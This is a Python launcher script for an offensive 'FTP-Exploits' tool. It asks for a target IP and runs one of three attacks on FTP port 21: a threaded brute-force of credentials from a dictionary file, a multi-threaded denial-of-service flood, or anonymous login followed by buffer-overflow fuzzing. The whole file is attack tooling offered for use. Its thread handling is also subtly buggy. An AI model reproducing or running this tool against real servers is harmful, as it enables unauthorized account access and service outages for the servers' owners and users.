from ftp_brute import FTP
from ftp_dos import DoS
from buffer_overflow import FTPFuzz
from check_ip import check_ip
import threading

print(
    """

     _____ _____ ____    _____            _       _ _       
    |  ___|_   _|  _ \  | ____|_  ___ __ | | ___ (_) |_ ___ 
    | |_    | | | |_) | |  _| \ \/ / '_ \| |/ _ \| | __/ __|   ~>FTP-Exploits<~
    |  _|   | | |  __/  | |___ >  <| |_) | | (_) | | |_\__ |  ~~>Made by tfwcodes(github)<~~
    |_|     |_| |_|     |_____/_/\_\ .__/|_|\___/|_|\__|___/
                                   |_|       
        """
)

ip = input("[main@console] \n└─Enter the target ip address: ")
check_ip.ip_check(ip)

print("\n" + "Modes: " + "\n" + "    #~ '-brute' - Brute Force Ftp. " + "\n" + "    #~ '-ddos' - DDoS Ftp." + "\n" + "    #~ 'buffer-overflow' Buffer Overflow Attack.")
mode = input("[main@console] \n└─Enter the mode: ")

threads = []
started = 0

if mode == "-brute":
    dictionary = input("[brute@console] \n└─Enter the dictionary: ")
    passwlist = open(dictionary, "r")

    for line in passwlist:
        user = line.split(":")[0]
        password = line.split(":")[1].strip("\n")

        threads = []
        
        def worker():
            FTP.brute(ip, 21, user, password)

        t = threading.Thread(target=worker)
        t.start()
        started += 1
        threads.append(t)

        if started > 100:
            started = 0
            for t in threads:
                t.join()
                threads.remove(t)
        
    

elif mode == "-ddos":
    threads_number = input("[ddos@console] \n└─Enter the number of threads: ")
    
    def dos_attack():
        DoS.dos(ip=ip, port=21)
    
    threads_list = []

    for i in range(int(threads_number)):
        t = threading.Thread(target=dos_attack)
        t.daemon = True
        threads_list.append(t)
    
    for i in range(int(threads_number)):
        threads_list[i].start()
    
    for i in range(int(threads_number)):
        threads_list[i].join()

elif mode == "-buffer-overflow":
    print("Trying anonymous login...")
    FTPFuzz.anon_login(ip, 21)
    print("Trying buffer overflow...")
    FTPFuzz.ftp_fuzz(ip, 21)

else:
    print(f"Invalid command [{mode}]")
